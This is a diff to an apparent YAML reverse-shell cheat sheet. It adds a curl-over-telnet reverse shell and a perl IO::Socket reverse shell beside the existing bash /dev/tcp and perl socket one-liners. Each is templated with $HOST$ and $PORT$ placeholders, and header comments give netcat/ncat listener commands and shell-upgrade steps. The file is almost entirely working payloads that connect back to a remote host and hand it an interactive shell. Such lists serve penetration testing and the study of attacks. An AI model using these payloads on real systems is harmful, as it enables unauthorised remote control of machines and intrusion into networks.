@@ -3,11 +3,15 @@
 # - https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c
 # - https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
 # - msfvenom
+# - https://www.revshells.com/
 #
 # catch:
 # - simple: nc -lnvp $PORT$
 # - improved: rlwrap ncat -C -v -4 -l -p $PORT$ -k
 # - upgrade with: Ctrl-Z, stty raw -echo, fg, reset, export SHELL=bash, export TERM=xterm-256color, stty rows <num> columns <cols>
+
+curl:
+  telnet: c='curl -Ns telnet://$HOST$:$PORT$'; $c </dev/null 2>&1 | sh 2>&1 | $c >/dev/null
 
 bash:
   tcp: bash -i >& /dev/tcp/$HOST$/$PORT$ 0>&1
@@ -27,6 +31,7 @@ ruby:
 
 perl:
   connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton("$HOST$")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  no_sh: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$HOST$:$PORT$");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
 openssl:
   # catch with 'ncat --ssl'
